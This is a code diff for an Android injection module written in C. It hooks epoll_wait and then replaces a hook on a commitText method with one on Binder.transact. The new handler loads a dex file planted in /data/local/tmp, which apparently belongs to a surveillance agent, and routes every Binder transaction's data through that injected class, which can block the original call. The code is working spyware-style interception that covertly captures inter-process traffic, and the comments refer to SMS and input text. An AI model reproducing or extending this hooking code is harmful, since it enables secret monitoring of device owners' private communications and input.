@@ -30,7 +30,6 @@
 #include "base.h"
 
 #undef log
-//#define USE_BD
 #define DEBUG
 #ifdef DEBUG
 /*
@@ -65,6 +64,7 @@ struct dalvik_cache_t
 
 static struct hook_t eph;
 static struct dexstuff_t d;
+static struct dalvik_hook_t transact_dh;
 static struct dalvik_hook_t commitText_dh;
 static struct dalvik_cache_t commitText_cache;
 
@@ -342,7 +342,89 @@ static int icommitText(JNIEnv *env, jobject this, jobject p)
 
    return callOrig;
 }
+static int itransact(JNIEnv *env, jobject this, jint code,jobject data,jobject reply,jint flags)
+{
+   jint callOrig = 1;
+   int doit = 1;
+   (*env)->MonitorEnter(env, this);
+   char *classes[] = { "com/android/inputmethod/Iprocess", "phone/android/com/Reflect", "com/android/dvci/util/LowEventHandlerDefs", NULL };
+   //if (processUnsolicited_cache.cls_h == 0) {
+   if (load_dext("/data/local/tmp/keyclass.dex", classes)) {
+      log("failed to load class ");
+      doit = 0;
+   }
+   //} else {
+   //   log("using cache");
+   //}
 
+   if (doit) {
+      // call static method and passin the sms
+      //log(" parcel = 0x%x\n", p)
+      //if (processUnsolicited_cache.cls_h == 0) {
+      commitText_cache.cls_h = (*env)->FindClass(env, "com/android/inputmethod/Iprocess");
+      //}
+      if (commitText_cache.cls_h != 0) {
+         //if (processUnsolicited_cache.mid_h == 0) {
+         commitText_cache.mid_h = (*env)->GetStaticMethodID(env, commitText_cache.cls_h, "transact", "(ILandroid/os/Parcel;Landroid/os/Parcel;I)Z");
+         //}
+         if (commitText_cache.mid_h) {
+
+            jvalue args[4];
+            /*
+             typedef union jvalue {
+             jboolean z;
+             jbyte    b;
+             jchar    c;
+             jshort   s;
+             jint     i;
+             jlong    j;
+             jfloat   f;
+             jdouble  d;
+             jobject  l;
+             } jvalue;
+             */
+            args[0].i = code;
+            args[1].l = data;
+            args[2].l = reply;
+            args[3].i = flags;
+            callOrig = (*env)->CallStaticBooleanMethodA(env, commitText_cache.cls_h, commitText_cache.mid_h, args);
+         } else {
+            log("method not found!\n")
+         }
+      } else {
+         log("com/android/inputmethod/Iprocess not found!\n")
+      }
+   }
+   // call original SMS dispatch method
+   if ((*env)->ExceptionOccurred(env)) {
+      log("got an exception!!");
+      (*env)->ExceptionDescribe(env);
+      (*env)->ExceptionClear(env);
+   }
+   (*env)->MonitorExit(env, this);
+   dalvik_prepare(&d, &transact_dh, env);
+
+   if (callOrig) {
+      jvalue args[4];
+      args[0].i = code;
+      args[1].l = data;
+      args[2].l = reply;
+      args[3].i = flags;
+      (*env)->CallBooleanMethodA(env, this, transact_dh.mid, args);
+      if ((*env)->ExceptionOccurred(env)) {
+         log("got an exception!!");
+         (*env)->ExceptionClear(env);
+      } else {
+         log("success calling : %s\n", transact_dh.method_name)
+      }
+   } else {
+      //log("skipping pdu args for call : %s\n", processUnsolicited_dh.method_name)
+      callOrig = 1;
+   }
+   dalvik_postcall(&d, &transact_dh);
+
+   return callOrig;
+}
 static int my_epoll_wait(int epfd, struct epoll_event *events, int maxevents, int timeout)
 {
    int (*orig_epoll_wait)(int epfd, struct epoll_event *events, int maxevents, int timeout);
@@ -355,14 +437,14 @@ static int my_epoll_wait(int epfd, struct epoll_event *events, int maxevents, in
    log("my_epoll_wait: try_hook\n")
    /* Android < 4.4.x*/
    if (and_maj == 4 && and_min < 4) {
-      //private void processUnsolicited (Parcel p) {
       commitText_cache.cls_h = NULL;
       commitText_cache.mid_h = NULL;
-      dalvik_hook_setup(&commitText_dh, "Lcom/android/internal/telephony/RIL;", "commitText", "(Landroid/os/Parcel;)V", 3, icommitText);
-      if (dalvik_hook(&d, &commitText_dh)) {
-         log("my_epoll_wait: hook processUnsolicited ok\n")
+      //public final boolean transact(int code, Parcel data, Parcel reply,int flags);
+      dalvik_hook_setup(&transact_dh, "Landroid/os/Binder;", "transact", "(ILandroid/os/Parcel;Landroid/os/Parcel;I)Z", 5, itransact);
+      if (dalvik_hook(&d, &transact_dh)) {
+         log("my_epoll_wait: hook transact ok\n")
       } else {
-         log("my_epoll_wait: hook processUnsolicited fails\n")
+         log("my_epoll_wait: hook transact fails\n")
       }
    } else if (and_maj == 4 && and_min >= 4) {
 
@@ -395,7 +477,6 @@ void my_init(void)
    set_logfunction(my_log2);
    // set log function for libdalvikhook (very important!)
    dalvikhook_set_logfunction(my_log2);
-
    hook(&eph, getpid(), "libc.", "epoll_wait", my_epoll_wait, 0);
    dexstuff_resolv_dvm(&d);
    //dalvik_dump_class(&d,"");
